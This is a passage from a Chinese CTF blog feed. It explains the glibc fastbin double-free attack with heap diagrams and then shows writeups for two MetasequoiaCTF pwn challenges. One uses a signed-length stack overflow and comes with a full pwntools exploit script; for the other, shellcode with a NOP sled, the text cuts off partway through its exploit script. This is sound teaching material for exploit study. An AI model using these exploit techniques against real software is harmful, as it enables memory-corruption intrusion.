class="keyword">int</span> idx = fastbin_index(<span class="built_in">size</span>);</span><br><span class="line">fb = &amp;fastbin (av, idx);</span><br><span class="line"><span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">mchunkptr old = *fb;</span><br><span class="line"><span class="comment">// 这里省略部分代码</span></span><br><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">   add (i.e., double free).  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"double free or corruption (fasttop)"</span>);</span><br><span class="line">p-&gt;fd = old;</span><br></pre></td></tr></table></figure></div><p><code>free()</code>还检查了 fastbin 里的 chunk 的 size 大小是否符合该 fastbin 的大小。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">   size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">   only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">   allocated again.  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span></span><br><span class="line">    &amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"invalid fastbin entry (free)"</span>);</span><br></pre></td></tr></table></figure></div><p>结合上面的代码，我们可以通过如下方法绕过检查：分配两个 chunk，分别命名为 chunk0 和 chunk1，然后<code>free(chunk0);free(chunk1);free(chunk0)</code>就可以绕过上面的检查来进行 double free。此时的 fastbin 链表应该如下图所示。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+------------+</span><br><span class="line">|            |</span><br><span class="line">| fastbinY[i]|</span><br><span class="line">|            |</span><br><span class="line">+-----+------+</span><br><span class="line">      |</span><br><span class="line">      |</span><br><span class="line">      v</span><br><span class="line">+-----+------+</span><br><span class="line">|            |</span><br><span class="line">|   chunk0   +&lt;-----+</span><br><span class="line">|            |      |</span><br><span class="line">+-----+------+      |</span><br><span class="line">      |             |</span><br><span class="line">      |             |</span><br><span class="line">      v             |</span><br><span class="line">+-----+------+      |</span><br><span class="line">|            |      |</span><br><span class="line">|   chunk1   +------+</span><br><span class="line">|            |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure></div><p>在前面的<code>free()</code>后我们进行第一次<code>malloc()</code>，就可以分配到 chunk0。我们伪造一个 fake chunk，往 chunk0 的数据段中写入 fake chunk 的地址，就可以将 chunk0 的 fd 指向 fake chunk，即将 fake chunk 添加进了 fastbin 链表中。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一次 malloc() 分配到 chunk0，修改其 fd 指针</span></span><br><span class="line">       +------------+</span><br><span class="line">       |            |</span><br><span class="line">+------+ fastbinY[i]|</span><br><span class="line">|      |            |</span><br><span class="line">|      +------------+       +-------------+</span><br><span class="line">|                           |             |</span><br><span class="line">|            +-------------&gt;+  fake chunk |</span><br><span class="line">|            |              |             |</span><br><span class="line">|      +-----+------+       +-------------+</span><br><span class="line">|      |            |</span><br><span class="line">|      |   chunk0   +&lt;-----+</span><br><span class="line">|      |            |      |</span><br><span class="line">|      +------------+      |</span><br><span class="line">|                          |</span><br><span class="line">|                          |</span><br><span class="line">|                          |</span><br><span class="line">|      +------------+      |</span><br><span class="line">|      |            |      |</span><br><span class="line">+-----&gt;+   chunk1   +------+</span><br><span class="line">       |            |</span><br><span class="line">       +------------+</span><br></pre></td></tr></table></figure></div><p>然后进行两次<code>malloc()</code>，依次分配到 chunk1 和 chunk0，最后再进行<code>malloc()</code>时就可以分配到 fake chunk。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第二次 malloc()</span></span><br><span class="line">       +------------+</span><br><span class="line">       |            |</span><br><span class="line">+------+ fastbinY[i]|</span><br><span class="line">|      |            |</span><br><span class="line">|      +------------+       +-------------+</span><br><span class="line">|                           |             |</span><br><span class="line">|            +-------------&gt;+  fake chunk |</span><br><span class="line">|            |              |             |</span><br><span class="line">|      +-----+------+       +-------------+</span><br><span class="line">|      |            |</span><br><span class="line">+-----&gt;+   chunk0   |</span><br><span class="line">       |            |</span><br><span class="line">       +------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       +------------+</span><br><span class="line">       |            |</span><br><span class="line">       |   chunk1   |</span><br><span class="line">       |  allocated |</span><br><span class="line">       +------------+</span><br></pre></td></tr></table></figure></div><p>由于之前将 chunk0 的 fd 指针指向了 fake chunk，并且 chunk0 还呆在 fastbin 里，所以第三次 <code>malloc()</code>时，<code>malloc()</code>会将 chunk0 的 fd 赋给 <code>fastbinY[i]</code>，此时只要再进行一次<code>malloc()</code>就可以分配到 fake chunk 了。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第三次 malloc()</span></span><br><span class="line">+------------+</span><br><span class="line">|            |</span><br><span class="line">| fastbinY[i]|</span><br><span class="line">|            |</span><br><span class="line">+-----+------+       +-------------+</span><br><span class="line">      |              |             |</span><br><span class="line">      +-------------&gt;+  fake chunk |</span><br><span class="line">                     |             |</span><br><span class="line">+------------+       +-------------+</span><br><span class="line">|            |</span><br><span class="line">|   chunk0   |</span><br><span class="line">|  allocated |</span><br><span class="line">+------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+------------+</span><br><span class="line">|            |</span><br><span class="line">|   chunk1   |</span><br><span class="line">|  allocated |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure></div><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p><code>malloc</code>到fake chunk时，会检查chunk的size是否合法，所以在伪造chunk时，需要考虑size的问题。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fake     +---------------------+</span><br><span class="line">chunk -&gt; |   xxxx   |   <span class="built_in">size</span> |<span class="number">1</span>|</span><br><span class="line">         |   *fd    |   xxxx   |</span><br><span class="line">         |        xxxxx        |</span><br><span class="line">         +---------------------+</span><br></pre></td></tr></table></figure></div><p>例如：<code>malloc(0x40)</code>时，将要分配一个<code>0x50</code>大小的<code>fast chunk</code>：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  0x4005c7 &lt;main+97&gt;     mov    edi, 0x40</span><br><span class="line">► 0x4005cc &lt;main+102&gt;    call   malloc@plt &lt;0x400450&gt;</span><br></pre></td></tr></table></figure></div><p>此时<code>fastbin</code>中存在<code>0x50</code>的chunk：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x602000</span> —▸ <span class="number">0x602050</span> ◂— <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure></div><p>查看这个<code>chunk</code>的size，为<code>0x51</code>(P=1)：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>xg <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000051</span></span><br><span class="line"><span class="number">0x602010</span>:<span class="number">0x0000000000602050</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></div><p>此时可以<code>malloc</code>成功，经测试，只要size在<code>0x50-0x60</code>的范围内都可以。</p><h1 id="小结-amp-例题"><a href="#小结-amp-例题" class="headerlink" title="小结&amp;例题"></a>小结&amp;例题</h1><p>通过 fastbin double free 可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。(栗子：<a href="http://47.100.63.152/2020/02/21/MetasequoiaCTF-writeup/#Summoner" target="_blank" rel="noopener">MetasequoiaCTF Summoner</a>)</p><p>如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 (首先要通过验证)，这就相当于任意地址写任意值的效果。(栗子：<a href="http://47.100.63.152/2020/02/12/2020-Hgame-pwn-writeup/#Roc826" target="_blank" rel="noopener">Hgame2020 Roc826</a>、<a href="http://47.100.63.152/2020/02/21/MetasequoiaCTF-writeup/#Samsara" target="_blank" rel="noopener">MetasequoiaCTF Samsara</a>)</p>]]></content>
      
      
      <categories>
          
          <category> pwn总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> double free </tag>
            
            <tag> fastbin attack </tag>
            
            <tag> glibc heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MetasequoiaCTF writeup</title>
      <link href="/2020/02/21/MetasequoiaCTF-writeup/"/>
      <url>/2020/02/21/MetasequoiaCTF-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不知道是什么学校办的CTF比赛，从<a href="https://imagin.vip/" target="_blank" rel="noopener">imagin</a>师傅那里听说的，比赛时间是2月20日13:00到2月21日17:00，持续1天零4个小时，题目总体来说难度不大，适合练习，平台提供容器化专属题目环境，这点很赞。</p><p>比赛截图<br><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200221205756.png" data-fancybox="group" data-caption="fb" class="fancybox"><img alt="fb" title="fb" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200221205756.png" src="/img/loading.gif" class="lazyload"></a><br><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/pic/solved2.png" data-fancybox="group" data-caption="solved2.png" class="fancybox"><img alt="solved2.png" style="zoom:80%;" title="solved2.png" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/pic/solved2.png" src="/img/loading.gif" class="lazyload"></a></p><blockquote><p>比赛知名度不高，参赛人数不多，排名第一实属侥幸</p></blockquote><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><p>pwn题目总体来说难度不大，有两道堆入门级别的题目，正好拿来练手</p><h2 id="Blacksmith"><a href="#Blacksmith" class="headerlink" title="Blacksmith"></a>Blacksmith</h2><ul><li><p>题目描述：</p><blockquote><p>世界需要你去拯救！不过在那之前，先让铁匠为你打造一把称手的兵器吧。<br>By <em>Mercurio</em></p></blockquote></li><li><p>题目附件：<a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/Blacksmith/blacksmith" target="_blank" rel="noopener">blacksmith</a></p></li><li><p>考察点：无符号整数</p></li><li><p>难度：简单</p></li><li><p>初始分值：100</p></li><li><p>最终分值：85</p></li><li><p>完成人数：5</p></li></ul><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>忘记密码的函数如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">forget</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  nbytes = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Forging..."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What's the size of this sword's name?"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>;</span><br><span class="line">  <span class="keyword">if</span> ( nbytes &gt; <span class="number">63</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"The name is too long!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"And the name is?"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Here you are, the new sword!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>其中<code>read</code>的第三个参数是无符号整数，而<code>nbytes</code>是有符号整数，所以输入负数可以绕过长度检查，然后读大量数据造成栈溢出，执行程序中的后门</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./blacksmith'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">prdi = <span class="number">0x0000000000400b23</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line">offset = <span class="number">72</span></span><br><span class="line">payload = <span class="string">'A'</span>*offset</span><br><span class="line">payload += p64(<span class="number">0x4007D6</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">'Your choice &gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">sla(<span class="string">' name?\n'</span>,<span class="string">'-1'</span>)</span><br><span class="line">ru(<span class="string">'And the name is?\n'</span>)</span><br><span class="line">debug()</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># info_addr('tag',addr)</span></span><br><span class="line"><span class="comment"># log.warning('--------------')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="Snow-Mountain"><a href="#Snow-Mountain" class="headerlink" title="Snow Mountain"></a>Snow Mountain</h2><ul><li><p>题目描述：</p><blockquote><p>带<strong>雪橇</strong>了吗？一起<strong>滑雪</strong>！ </p><p>By <em>Mercurio</em>                            </p></blockquote></li><li><p>题目附件：<a href="https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/SnowMountain/snow_mountain" target="_blank" rel="noopener">snow_mountain</a></p></li><li><p>考察点：shellcode、nop sled</p></li><li><p>难度：简单</p></li><li><p>初始分值：200</p></li><li><p>最终分值：184</p></li><li><p>完成人数：5</p></li></ul><p>分析程序：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *rnd_pos; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> (__fastcall *sc)(<span class="keyword">const</span> <span class="keyword">char</span> *, _QWORD); <span class="comment">// [rsp+8h] [rbp-1008h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed; <span class="comment">// [rsp+10h] [rbp-1000h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  srand(&amp;seed);</span><br><span class="line">  load_bg();</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">"You know you have to conquer the mountain before you fight with the Demon Dragon. Luckily, you've prepared a sled for skiing.\n"</span>);</span><br><span class="line">  rnd_pos = sub_400841();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"You check the map again. You need to reach the lair of the Demon Dragon.\nCurrent position: %p\n\n"</span>, rnd_pos);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's your plan, hero?\n&gt; "</span>);</span><br><span class="line">  fgets(&amp;seed, <span class="number">4096</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Where are you going to land?\n&gt; "</span>, <span class="number">4096L</span>L);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%p"</span>, &amp;sc);</span><br><span class="line">  sc(<span class="string">"%p"</span>, &amp;sc);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>程序末尾跳到指定位置执行shellcode，之前还给了一个栈的地址，但是读数据的时候加上了随机偏移，所以用足够多的nop填充在shellcode前面即可。</p><blockquote><p>后来看官方wp，原来这种操作叫做nop sled :D</p></blockquote><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span 